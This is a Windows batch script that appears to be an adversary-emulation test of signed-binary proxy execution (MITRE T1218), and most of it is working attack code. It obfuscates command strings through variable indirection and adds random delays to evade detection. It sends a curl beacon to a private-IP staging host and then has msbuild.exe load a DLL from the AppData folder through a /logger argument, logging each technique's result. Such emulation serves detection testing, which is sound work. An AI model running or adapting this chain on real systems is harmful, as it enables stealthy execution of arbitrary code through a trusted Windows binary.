@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder variables (plain literals - NEVER obfuscate)
SET txisnba=%APPDATA%\7858\1c0ddb11
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7858-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=potoshop.txt
SET dvhhyc=7858

REM Derived variables
SET cwqazx=%APPDATA%\!rrocubc!
SET zxfgtr=!cwqazx!\macula-simulations.log

REM Initial random delay (30-60 seconds)
SET /A qsdfgb=30 + !RANDOM! %% 31
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Initial delay start>> "!zxfgtr!" 2>nul
timeout /t !qsdfgb! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Initial delay complete>> "!zxfgtr!" 2>nul

REM Obfuscated curl command parts
SET pxcvbn=cu
SET mnbvcz=rl
SET lkjhgf=-k
SET poiuy=-s
SET asdfgh=-o
SET qwerty=nul

REM Build curl command with variable indirection
SET yuiop=!pxcvbn!!mnbvcz!
SET hjkla=!lkjhgf! !poiuy! !asdfgh!!qwerty!

REM Heartbeat check with obfuscated curl
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Heartbeat check start>> "!zxfgtr!" 2>nul
!yuiop! !hjkla! "!keghkgto!"
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Heartbeat failed - error !ERRORLEVEL!>> "!zxfgtr!" 2>nul
    SET ttp_result=0
    SET ttp_error=connection_refused
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Heartbeat success>> "!zxfgtr!" 2>nul
    SET ttp_result=1
    SET ttp_error=
)

REM TTP logging for heartbeat (T1218)
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET log_ts=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!log_ts!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!zxfgtr!" 2>nul

REM Mid-script delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Mid-script delay start>> "!zxfgtr!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Mid-script delay complete>> "!zxfgtr!" 2>nul

REM Obfuscate msbuild.exe path with variable indirection
SET vfghjk=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\m
SET bnmtyu=sbuild.exe
SET zxcvf=!vfghjk!!bnmtyu!

REM Check if msbuild exists at full path
IF NOT EXIST "!zxcvf!" (
    SET zxcvf=msbuild.exe
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Using PATH msbuild.exe>> "!zxfgtr!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Using full path msbuild.exe>> "!zxfgtr!" 2>nul
)

REM Obfuscate logger arguments
SET qazwsx=/logger:LoggerEntry,
SET edcrfv=!txisnba!\
SET tgbyhn=!xzanpex!
SET yhnujm=;MyParameters,Foo

REM Build final command with multiple indirection layers
SET cmd_part1=!qazwsx!!edcrfv!
SET cmd_part2=!tgbyhn!!yhnujm!
CALL SET final_cmd=%%cmd_part1%%%%cmd_part2%%

REM Execute DLL with msbuild
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Starting msbuild execution>> "!zxfgtr!" 2>nul
"!zxcvf!" !final_cmd!
SET exec_result=!ERRORLEVEL!

IF !exec_result! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DLL execution successful>> "!zxfgtr!" 2>nul
    SET ttp2_result=1
    SET ttp2_error=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DLL execution failed - error !exec_result!>> "!zxfgtr!" 2>nul
    SET ttp2_result=0
    SET ttp2_error=assembly_load_failed
)

REM TTP logging for msbuild execution (T1218)
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime2=%%I
SET log_ts2=!datetime2:~0,4!-!datetime2:~4,2!-!datetime2:~6,2! !datetime2:~8,2!:!datetime2:~10,2!:!datetime2:~12,2!.!datetime2:~15,3!
echo [!log_ts2!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution: Msbuild=!ttp2_result!:!ttp2_error!>> "!zxfgtr!" 2>nul

REM Random final delay
SET /A final_delay=10 + !RANDOM! %% 11
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Final random delay !final_delay! seconds>> "!zxfgtr!" 2>nul
CHOICE /C Y /N /D Y /T !final_delay! >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Script complete>> "!zxfgtr!" 2>nul

ENDLOCAL